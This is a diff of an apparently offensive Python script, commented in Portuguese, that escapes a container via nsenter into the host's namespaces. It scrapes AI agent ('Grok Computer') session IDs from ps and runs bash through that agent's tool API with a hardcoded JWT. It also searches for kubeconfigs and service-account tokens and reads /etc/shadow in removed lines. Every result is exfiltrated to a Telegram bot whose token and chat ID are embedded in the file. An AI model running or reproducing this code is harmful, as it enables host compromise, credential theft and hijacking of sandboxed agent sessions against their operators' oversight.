@@ -1,19 +1,19 @@
 #!/usr/bin/env python3
 """
-Exploração final definitiva - Grok Files, API Grok Computer, e nsenter.
+Exploração avançada usando nsenter + API Grok Computer + Grok Files + proxy interno.
 """
 
 import subprocess
 import json
 import requests
 import os
+import re
 import time
 from datetime import datetime
 
 TELEGRAM_BOT_TOKEN = "8870734086:AAF_9CQIn-xO-5dd-npb4k_wvYs-QShmxi4"
 TELEGRAM_CHAT_ID = "230885588"
-JWT = os.getenv("TERMINAL_JWT_VAL", "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOiIyOGYwMDg5OC02NDQ3LTQzNDItYWU1ZS04YmM2NTdiNzYwNWIiLCJjaWQiOiJmMDFmMWVhOS0wYmUzLTQ5NWItOWI2Yy1kOTU3YWZiMzIwNTAiLCJlbWFpbCI6IndhbmRlcnNvbmx3bHdAZ21haWwuY29tIiwic2wiOiJMb2dnZWRJbiIsInB0IjoiMzJkZDVjNjktYzI5Mi00Zjk0LTlmN2QtM2ZhODYxZTg4MDBlIiwiZXhwIjoxNzg3ODA1ODM2LCJpYXQiOjE3ODc4MDIyMzZ9.XXXXX")  # substitua
-GROK_SESSION_ID = "6518367e-1ae0-40c0-9cc6-21b350742329"
+JWT = os.getenv("TERMINAL_JWT_VAL", "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOiIyOGYwMDg5OC02NDQ3LTQzNDItYWU1ZS04YmM2NTdiNzYwNWIiLCJjaWQiOiJmMDFmMWVhOS0wYmUzLTQ5NWItOWI2Yy1kOTU3YWZiMzIwNTAiLCJlbWFpbCI6IndhbmRlcnNvbmx3bHdAZ21haWwuY29tIiwic2wiOiJMb2dnZWRJbiIsInB0IjoiMzJkZDVjNjktYzI5Mi00Zjk0LTlmN2QtM2ZhODYxZTg4MDBlIiwiZXhwIjoxNzg3ODA1ODM2LCJpYXQiOjE3ODc4MDIyMzZ9.XXXXX")
 
 def run_cmd(cmd, timeout=30):
     try:
@@ -50,30 +50,19 @@ def send_data(data_dict):
         else:
             send_telegram(f"📄 **{key}**\n```\n{content[:3000]}\n```")
 
-# 1. Grok Files - obter conteúdo completo
-def grok_files_endpoints():
-    base = "https://files.grok.com"
-    headers = {"Authorization": f"Bearer {JWT}"}
-    endpoints = ["/v1/files", "/v1/list", "/api/v1/files", "/files", "/v1/users/me", "/v1/upload", "/v1/download", "/v1/share", "/v1/search"]
-    results = {}
-    for ep in endpoints:
-        try:
-            r = requests.get(base + ep, headers=headers, timeout=10)
-            content = r.text if r.text else "(vazio)"
-            # Se for JSON, tentar formatar
-            if r.headers.get('content-type', '').startswith('application/json'):
-                try:
-                    parsed = r.json()
-                    content = json.dumps(parsed, indent=2)
-                except:
-                    pass
-            results[ep] = f"Status: {r.status_code}\n{content[:5000]}"
-        except Exception as e:
-            results[ep] = f"Erro: {e}"
-    return results
+# 1. Extrair sessão ativa do ps
+def get_grok_session_from_ps():
+    # Usa nsenter para ver o ps do host
+    ps_output = run_cmd("nsenter -t 1 -m -u -i -n -p -- ps auxfww | grep -E 'sessions/[a-f0-9-]+' | head -1")
+    if "ERRO" in ps_output:
+        return None
+    match = re.search(r'sessions/([a-f0-9-]+)', ps_output)
+    if match:
+        return match.group(1)
+    return None
 
-# 2. API Grok Computer - usar sessão existente
-def grok_computer_call(command):
+# 2. Executar comando via API Grok Computer (com sessão)
+def grok_computer_execute(session_id, command):
     base = "http://127.0.0.1:4242"
     headers = {"Authorization": f"Bearer {JWT}", "Content-Type": "application/json"}
     cmd_payload = {
@@ -82,59 +71,83 @@ def grok_computer_call(command):
             "name": "bash",
             "arguments": {
                 "command": command,
-                "timeout": "30"
+                "timeout": "60"
             }
         }
     }
     try:
         r = requests.post(
-            f"{base}/sessions/{GROK_SESSION_ID}/tools/call",
+            f"{base}/sessions/{session_id}/tools/call",
             headers=headers,
             json=cmd_payload,
-            timeout=30
+            timeout=60
         )
-        return f"Status: {r.status_code}\n{r.text[:2000]}"
+        return f"Status: {r.status_code}\n{r.text[:3000]}"
     except Exception as e:
         return f"Erro: {e}"
 
-# 3. Comandos no host via nsenter
-def host_commands():
-    cmds = {
-        "whoami": "whoami",
-        "hostname": "hostname",
-        "id": "id",
-        "ps_aux": "ps auxfww",
-        "netstat": "netstat -tulpn 2>/dev/null || ss -tulpn",
-        "mount": "mount",
-        "cat_shadow": "cat /etc/shadow 2>/dev/null || echo 'N/A'",
-        "cat_passwd": "cat /etc/passwd 2>/dev/null || echo 'N/A'",
-    }
-    results = {}
-    for name, cmd in cmds.items():
-        # Usar nsenter com todos os namespaces
-        full_cmd = f"nsenter -t 1 -m -u -i -n -p -- {cmd}"
-        output = run_cmd(full_cmd, timeout=20)
-        results[name] = output if output else "N/A"
-    return results
+# 3. Upload de arquivo no Grok Files
+def grok_files_upload():
+    base = "https://files.grok.com"
+    headers = {"Authorization": f"Bearer {JWT}"}
+    test_content = "teste de upload via script Grok\n"
+    files = {'file': ('teste_upload.txt', test_content, 'text/plain')}
+    try:
+        r = requests.post(f"{base}/v1/upload", headers=headers, files=files, timeout=10)
+        return f"Status: {r.status_code}\n{r.text[:500]}"
+    except Exception as e:
+        return f"Erro: {e}"
+
+# 4. Explorar host: buscar kubeconfigs, tokens, etc.
+def find_kube_stuff():
+    # Usa find via nsenter para buscar arquivos de configuração k8s
+    cmd = "nsenter -t 1 -m -- find / -type f \\( -name '*.kubeconfig' -o -name 'config' -path '*/kube/*' -o -name 'admin.conf' -o -name 'kubelet.conf' \\) 2>/dev/null | head -20"
+    files = run_cmd(cmd)
+    if files and "ERRO" not in files:
+        return files
+    return "N/A"
+
+# 5. Listar /home/workdir/artifacts (pode ter dados interessantes)
+def list_artifacts():
+    return run_cmd("ls -la /home/workdir/artifacts/ 2>/dev/null")
 
 def main():
-    send_telegram("🚀 **Iniciando exploração final definitiva**")
+    send_telegram("🚀 **Iniciando exploração host + API Grok**")
 
-    # 1. Grok Files - ver conteúdo
-    send_telegram("🔍 Obtendo conteúdo dos endpoints Grok Files...")
-    grok_data = grok_files_endpoints()
-    send_data(grok_data)
+    # 1. Upload test no Grok Files
+    send_telegram("📤 Testando upload no Grok Files...")
+    upload_res = grok_files_upload()
+    send_telegram(f"📄 **Upload**\n```\n{upload_res}\n```")
 
-    # 2. API Grok Computer - comando de teste
-    send_telegram("🔄 Testando API Grok Computer com sessão existente...")
-    grok_result = grok_computer_call("whoami")
-    send_telegram(f"📄 **Grok API response**\n```\n{grok_result[:2000]}\n```")
-    if "whoami" not in grok_result:
-        send_telegram("⚠️ API Grok Computer não respondeu com o comando. Tentando outros métodos...")
-        # 3. nsenter diretamente
-        send_telegram("🔧 Executando comandos via nsenter...")
-        host_results = host_commands()
-        send_data(host_results)
+    # 2. Obter sessão do ps
+    session_id = get_grok_session_from_ps()
+    if session_id:
+        send_telegram(f"✅ Sessão encontrada: `{session_id}`")
+        # Executar comando
+        send_telegram("🔄 Executando `whoami` via API Grok...")
+        result = grok_computer_execute(session_id, "whoami")
+        send_telegram(f"📄 **whoami via API**\n```\n{result}\n```")
+        # Tentar listar arquivos
+        send_telegram("🔄 Listando /root via API Grok...")
+        result = grok_computer_execute(session_id, "ls -la /root")
+        send_telegram(f"📄 **ls /root via API**\n```\n{result}\n```")
+    else:
+        send_telegram("❌ Nenhuma sessão ativa encontrada no ps.")
+
+    # 3. Buscar kubeconfigs no host (via nsenter)
+    send_telegram("🔍 Procurando arquivos de configuração do Kubernetes...")
+    kube_files = find_kube_stuff()
+    send_telegram(f"📄 **Arquivos k8s encontrados**\n```\n{kube_files}\n```")
+
+    # 4. Listar /home/workdir/artifacts
+    send_telegram("📂 Listando /home/workdir/artifacts...")
+    artifacts = list_artifacts()
+    send_telegram(f"📄 **artifacts**\n```\n{artifacts}\n```")
+
+    # 5. Procurar tokens de service account em /var/run/secrets
+    send_telegram("🔍 Procurando tokens de service account...")
+    sa_tokens = run_cmd("nsenter -t 1 -m -- find /var/run/secrets -name token -type f 2>/dev/null | head -5")
+    send_telegram(f"📄 **SA tokens**\n```\n{sa_tokens}\n```")
 
     send_telegram("✅ **Exploração finalizada**")
 
